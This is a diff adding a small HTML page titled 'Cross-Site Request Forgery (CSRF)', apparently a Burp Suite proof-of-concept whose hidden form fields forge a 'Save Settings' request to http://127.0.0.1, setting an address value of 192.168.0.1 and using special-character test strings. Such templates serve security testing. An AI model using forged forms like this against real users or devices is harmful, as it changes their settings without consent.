@@ -1,0 +1,15 @@
+<html>
+<header>
+	<title>Cross-Site Request Forgery (CSRF)</title>
+</header>
+<body>
+	<!-- Burp Suite -->
+	<form action="http://127.0.0.1" method="POST">
+		<input type="hidden" name="key" value="!#$&'()*+,/:;=?@[]" />
+		<input type="hidden" name="!#$&'()*+,/:;=?@[]" value="192&#46;168&#46;0&#46;1" />
+		<input type="hidden" name="save" value="Save&#32;Settings" />
+
+		<input type="submit" value="Submit Request" />
+	</form>
+</body>
+</html>
